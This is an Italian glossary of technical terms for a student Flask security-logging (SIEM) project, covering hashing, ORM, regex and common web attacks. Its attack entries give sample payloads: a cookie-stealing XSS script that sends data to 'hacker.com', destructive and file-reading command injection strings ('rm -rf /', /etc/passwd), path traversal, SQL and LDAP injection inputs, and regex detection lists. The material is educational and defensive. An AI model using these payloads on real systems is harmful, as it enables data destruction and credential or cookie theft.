# 📖 GLOSSARIO TECNICO - Security SIEM Project

> Definizioni di tutti i termini tecnici usati nel progetto, spiegate in modo semplice

---

## A

### API (Application Programming Interface)
**Definizione:** Insieme di regole che permettono a programmi di comunicare tra loro.

**Nel progetto:** 
- Route Flask come `/logs` sono API endpoint
- Browser fa richiesta HTTP → Flask risponde con HTML/JSON

**Esempio:**
```
Browser → GET /api/logs/latest → Flask
Flask → {"logs": [...]} → Browser
```

---

### Abort
**Definizione:** Interrompere richiesta HTTP con codice errore.

**Nel progetto:**
```python
abort(403)  # Forbidden
abort(404)  # Not Found
abort(500)  # Internal Server Error
```

**Quando:** Utente non autorizzato, risorsa non esiste, errore server.

---

## B

### Bcrypt
**Definizione:** Algoritmo di hashing per password, lento by design.

**Caratteristiche:**
- Aggiunge SALT automatico
- Configurabile (cost factor)
- Resistente a brute force

**Nel progetto:**
```python
hash = bcrypt.generate_password_hash('password123')
# Output: $2b$12$randomsalt...hashedpassword

is_valid = bcrypt.check_password_hash(hash, 'password123')
# Output: True
```

---

### Brute Force Attack
**Definizione:** Tentativo di indovinare password/dati provando tutte le combinazioni.

**Esempio:**
```
Tentativo 1: password → Fallito
Tentativo 2: password1 → Fallito
Tentativo 3: password123 → Fallito
...
Tentativo 1000: admin123 → Successo!
```

**Difesa nel progetto:**
- `SecurityAnalyzer.detect_brute_force()` rileva 5+ tentativi falliti
- Bcrypt rende lento ogni tentativo

---

### Backref (SQLAlchemy)
**Definizione:** Relazione bidirezionale automatica tra modelli.

**Nel progetto:**
```python
class Log:
    user = db.relationship('User', backref='logs')

# Ora puoi fare:
log.user          # Log → User (forward)
user.logs         # User → Log (backref automatico)
```

---

## C

### CRUD
**Definizione:** Create, Read, Update, Delete - operazioni base su database.

**Nel progetto (model/user.py):**
- **Create:** `create_user(username, password)`
- **Read:** `get_user_by_id(id)`, `get_user_by_username(username)`
- **Update:** `update_user(id, **kwargs)`
- **Delete:** `delete_user(id)`

---

### CSRF (Cross-Site Request Forgery)
**Definizione:** Attacco che forza utente autenticato a eseguire azioni non volute.

**Esempio attacco:**
```html
<!-- Sito malevolo -->
<img src="http://bank.com/transfer?to=hacker&amount=1000">
<!-- Se vittima è loggata su bank.com, trasferimento avviene! -->
```

**Difesa:** Token CSRF univoco per ogni form.

---

### CSS (Cascading Style Sheets)
**Definizione:** Linguaggio per definire stili visivi di pagine HTML.

**Nel progetto (static/styles.css):**
```css
body {
    background: #121212;  /* Sfondo nero */
    color: #e0e0e0;      /* Testo grigio chiaro */
}
```

---

### Command Injection
**Definizione:** Attacco che esegue comandi di sistema tramite input utente.

**Esempio:**
```
Input: ; rm -rf /
Input: && format C:
Input: `cat /etc/passwd`
```

**Difesa nel progetto:**
```python
COMMAND_PATTERNS = [
    r";\s*rm\s+-rf",
    r"&&\s*(rm|del|format)",
    r"`.*`"
]
```

---

## D

### Decorator (Python)
**Definizione:** Funzione che modifica comportamento di un'altra funzione.

**Nel progetto:**
```python
@app.route('/account')  # Decorator di Flask
@login_required         # Decorator di Flask-Login
def account():
    # Codice eseguito SOLO se route=/account E utente loggato
    pass
```

**Equivale a:**
```python
def account():
    pass

account = app.route('/account')(account)
account = login_required(account)
```

---

### Database Migration
**Definizione:** Modificare struttura database (aggiungere colonne, tabelle, ecc.).

**Nel progetto:**
```python
# Ricrea tutto da zero (distruttivo!)
python recreate_db.py

# Alternativa con Flask-Migrate (non usata):
# flask db init
# flask db migrate -m "Add column xyz"
# flask db upgrade
```

---

## E

### Escaping
**Definizione:** Convertire caratteri speciali in forma sicura.

**Esempio XSS:**
```
Input: <script>alert('XSS')</script>
Escaped: &lt;script&gt;alert('XSS')&lt;/script&gt;
Rendering: <script>alert('XSS')</script> (come testo, non codice!)
```

**In Jinja2:**
```jinja2
{{ user_input }}  <!-- Auto-escaped -->
{{ user_input | safe }}  <!-- NON escaped (pericoloso!) -->
```

---

## F

### Flask
**Definizione:** Micro-framework Python per creare applicazioni web.

**Componenti:**
- Routing (`@app.route()`)
- Template engine (Jinja2)
- Sessioni
- Request/Response handling

---

### Foreign Key (FK)
**Definizione:** Colonna che referenzia primary key di altra tabella.

**Nel progetto:**
```python
class Log:
    user_id = db.Column(db.Integer, db.ForeignKey('users.id'))
    # user_id deve esistere in users.id (o essere NULL)
```

**SQL equivalente:**
```sql
CREATE TABLE logs (
    id INTEGER PRIMARY KEY,
    user_id INTEGER,
    FOREIGN KEY (user_id) REFERENCES users(id)
);
```

---

### Flash Messages
**Definizione:** Messaggi temporanei mostrati all'utente (salvati in sessione).

**Nel progetto:**
```python
flash('Login riuscito!', 'success')
flash('Errore!', 'error')
```

```html
{% with messages = get_flashed_messages(with_categories=true) %}
    {% for category, message in messages %}
        <div class="alert-{{ category }}">{{ message }}</div>
    {% endfor %}
{% endwith %}
```

---

## H

### Hash
**Definizione:** Funzione one-way che converte input in stringa fissa.

**Proprietà:**
- Stesso input → stesso output
- Diverso input → diverso output (quasi sempre)
- **NON reversibile** (da hash non puoi ottenere input)

**Esempio:**
```
SHA256("hello") = 2cf24dba5fb0a30e...
SHA256("hello") = 2cf24dba5fb0a30e... (stesso!)
SHA256("helo")  = 8e55d8a...          (diverso!)
```

---

### HTTP Methods
**Definizione:** Verbi che descrivono azione su risorsa.

**Nel progetto:**
- **GET:** Richiede dati (visualizza pagina)
- **POST:** Invia dati (form submission)

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')  # Mostra form
    else:  # POST
        # Processa login
```

---

## J

### Jinja2
**Definizione:** Template engine per Python (usato da Flask).

**Sintassi:**
```jinja2
{{ variable }}              <!-- Output variabile -->
{% if condition %}...{% endif %}  <!-- Condizionale -->
{% for item in list %}...{% endfor %}  <!-- Loop -->
{% block content %}...{% endblock %}  <!-- Blocco sovrascrivibile -->
```

---

### JSON (JavaScript Object Notation)
**Definizione:** Formato testo per scambiare dati tra sistemi.

**Esempio:**
```json
{
    "id": 1,
    "username": "admin",
    "logs": [
        {"type": "LOGIN_SUCCESS", "ip": "192.168.1.1"},
        {"type": "LOGOUT", "ip": "192.168.1.1"}
    ]
}
```

**Nel progetto:**
```python
# Python → JSON
logs_json = [{'id': 1, 'type': 'LOGIN'}]
return jsonify(logs_json)

# Template → JavaScript
const logs = {{ logs_json | tojson }};
```

---

## L

### LDAP Injection
**Definizione:** Attacco su query LDAP (directory services).

**Esempio:**
```
Input: admin*)(|(password=*)
Query LDAP modificata per bypassare auth
```

---

## M

### Migration
Vedi [Database Migration](#database-migration)

---

### Model (MVC)
**Definizione:** Rappresentazione dati e logica business.

**Nel progetto:**
- `model/user.py` → Modello User
- `model/log.py` → Modello Log
- `model/validator.py` → Logica validazione

---

## O

### ORM (Object-Relational Mapping)
**Definizione:** Tecnica per interagire con database usando oggetti Python.

**Senza ORM (SQL puro):**
```python
cursor.execute("SELECT * FROM users WHERE username = ?", [username])
row = cursor.fetchone()
user = {'id': row[0], 'username': row[1], ...}
```

**Con ORM (SQLAlchemy):**
```python
user = User.query.filter_by(username=username).first()
print(user.id, user.username)
```

---

## P

### Path Traversal
**Definizione:** Attacco per accedere a file fuori dalla directory consentita.

**Esempio:**
```
Input: ../../etc/passwd
Input: ..\..\windows\system32\config\sam
```

**Difesa:**
```python
PATH_PATTERNS = [
    r"\.\./",           # ../
    r"\.\.\\",          # ..\
    r"/etc/passwd"
]
```

---

### Prepared Statement
**Definizione:** Query SQL con placeholder, previene SQL Injection.

**Vulnerabile:**
```python
query = f"SELECT * FROM users WHERE username = '{username}'"
# Se username = "admin' OR '1'='1", query diventa:
# SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

**Sicuro (prepared):**
```python
query = "SELECT * FROM users WHERE username = ?"
params = [username]
# Anche se username = "admin' OR '1'='1", viene trattato come STRINGA
```

**SQLAlchemy usa prepared statements automaticamente!**

---

## R

### Regex (Regular Expression)
**Definizione:** Pattern per cercare/validare stringhe.

**Esempi:**
```python
r"\d+"          # Uno o più digit (0-9)
r"[A-Z]"        # Una lettera maiuscola
r"^\w+@\w+\.\w+$"  # Email semplice

# Nel progetto:
r"(\bOR\b|\bAND\b)\s+['\"]?\d+['\"]?\s*=\s*['\"]?\d+['\"]?"
# Trova: OR 1=1, AND 1=1, OR '1'='1'
```

---

### Redirect
**Definizione:** Inviare browser a URL diverso.

**Nel progetto:**
```python
return redirect('/login')  # Vai a pagina login
return redirect(url_for('account'))  # Usa nome route
```

---

### Render Template
**Definizione:** Generare HTML da template + dati.

**Nel progetto:**
```python
@app.route('/logs')
def logs():
    logs = Log.query.all()
    return render_template('logs.html', logs=logs)
    # Template riceve variabile "logs"
```

---

## S

### SQL Injection
**Definizione:** Attacco che modifica query SQL tramite input.

**Esempio:**
```
Username: admin' OR '1'='1
Password: qualsiasi

Query: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='...'
Risultato: Login riuscito senza password!
```

**Difesa nel progetto:**
1. Validazione regex (`InputValidator`)
2. Prepared statements (SQLAlchemy)

---

### SQLAlchemy
**Definizione:** ORM per Python, astrazione su database SQL.

**Componenti:**
- **Model:** Classe Python = Tabella DB
- **Query:** Metodi per SELECT, WHERE, JOIN
- **Session:** Gestione transazioni

---

### Salt (Cryptography)
**Definizione:** Stringa random aggiunta a password prima di hash.

**Senza salt:**
```
User1: password123 → Hash: abc123xyz
User2: password123 → Hash: abc123xyz (UGUALE!)
```

**Con salt:**
```
User1: password123 + salt_random1 → Hash: abc123xyz
User2: password123 + salt_random2 → Hash: def456uvw (DIVERSO!)
```

**Bcrypt aggiunge salt automaticamente.**

---

### Session
**Definizione:** Dati persistenti per singolo utente tra richieste HTTP.

**Nel progetto:**
```python
# Flask-Login usa sessioni per tracciare utente loggato
login_user(user)  # Salva user.id in sessione
# Browser riceve cookie firmato

# Richieste successive:
current_user  # Flask-Login recupera user da sessione
```

---

## T

### Template
**Definizione:** File HTML con placeholder per dati dinamici.

**Esempio:**
```html
<!-- templates/account.html -->
<h1>Benvenuto {{ current_user.username }}!</h1>
```

**Rendering:**
```python
return render_template('account.html')
# Output: <h1>Benvenuto admin!</h1>
```

---

### Timestamp
**Definizione:** Data e ora in formato leggibile da computer.

**Nel progetto:**
```python
from datetime import datetime

log.timestamp = datetime.now()
# Output: 2025-11-03 14:30:25.123456

# Formato ISO per JSON:
log.timestamp.isoformat()
# Output: "2025-11-03T14:30:25.123456"
```

---

## U

### URL Encoding
**Definizione:** Convertire caratteri speciali in formato URL-safe.

**Esempio:**
```
Spazio: %20
/: %2F
..: %2e%2e

Path traversal encoded:
../../ → %2e%2e%2f%2e%2e%2f
```

**Difesa:**
```python
r"%2e%2e%2f"  # Rileva ../ encoded
```

---

## V

### Validator
**Definizione:** Classe/funzione che verifica correttezza/sicurezza dati.

**Nel progetto:**
- `InputValidator`: Rileva attacchi (SQL, XSS, CMD, PATH)
- `PasswordValidator`: Verifica forza password

---

## W

### Werkzeug
**Definizione:** Libreria WSGI usata internamente da Flask.

**Fornisce:**
- Routing
- Request/Response objects
- Debugging
- Security utilities

---

## X

### XSS (Cross-Site Scripting)
**Definizione:** Attacco che inietta JavaScript in pagina web.

**Esempio:**
```html
<!-- Input utente malevolo -->
<script>
    // Ruba cookie
    fetch('http://hacker.com/steal?cookie=' + document.cookie);
</script>

<!-- O più subdolo -->
<img src=x onerror="alert(document.cookie)">
```

**Difesa:**
1. Validazione input (`XSS_PATTERNS`)
2. Escaping automatico Jinja2
3. Content Security Policy headers

---

## Simboli Regex

### `\b` (Word Boundary)
**Definizione:** Inizio/fine parola.

```python
r"\bOR\b"
Match: "... OR ..."      # OR come parola
No match: "...WORD..."   # OR dentro WORD
```

---

### `\d` (Digit)
**Definizione:** Qualsiasi cifra 0-9.

```python
r"\d+"
Match: "123", "456789"
No match: "abc"
```

---

### `\s` (Whitespace)
**Definizione:** Spazio, tab, newline.

```python
r"\s+"
Match: " ", "   ", "\t", "\n"
```

---

### `\w` (Word Character)
**Definizione:** Lettera, cifra o underscore (a-z, A-Z, 0-9, _).

```python
r"\w+"
Match: "hello", "user_123"
No match: "hello world" (spazio non è \w)
```

---

### `+` (One or More)
**Definizione:** 1 o più occorrenze.

```python
r"\d+"
Match: "1", "123", "999999"
No match: "" (zero cifre)
```

---

### `*` (Zero or More)
**Definizione:** 0 o più occorrenze.

```python
r"\d*"
Match: "", "1", "123"
```

---

### `?` (Optional)
**Definizione:** 0 o 1 occorrenza.

```python
r"colou?r"
Match: "color", "colour"
No match: "colouur"
```

---

### `|` (OR)
**Definizione:** Alternativa.

```python
r"(cat|dog)"
Match: "cat", "dog"
No match: "bird"
```

---

### `^` (Start of String)
**Definizione:** Inizio stringa.

```python
r"^admin"
Match: "admin123"
No match: "my_admin"
```

---

### `$` (End of String)
**Definizione:** Fine stringa.

```python
r"\.com$"
Match: "example.com"
No match: "example.com.uk"
```

---

### `[]` (Character Class)
**Definizione:** Uno dei caratteri elencati.

```python
r"[aeiou]"
Match: "a", "e", "i", "o", "u"

r"[A-Z]"
Match: "A", "B", ..., "Z"

r"[^0-9]"
Match: qualsiasi NON cifra (^ = negazione dentro [])
```

---

## Acronimi Comuni

- **API**: Application Programming Interface
- **CRUD**: Create, Read, Update, Delete
- **CSRF**: Cross-Site Request Forgery
- **CSS**: Cascading Style Sheets
- **DB**: Database
- **FK**: Foreign Key
- **HTML**: HyperText Markup Language
- **HTTP**: HyperText Transfer Protocol
- **JS**: JavaScript
- **JSON**: JavaScript Object Notation
- **ORM**: Object-Relational Mapping
- **PK**: Primary Key
- **SQL**: Structured Query Language
- **URL**: Uniform Resource Locator
- **XSS**: Cross-Site Scripting

---

**Suggerimento:** Tieni questo file aperto mentre studi il codice! 📚
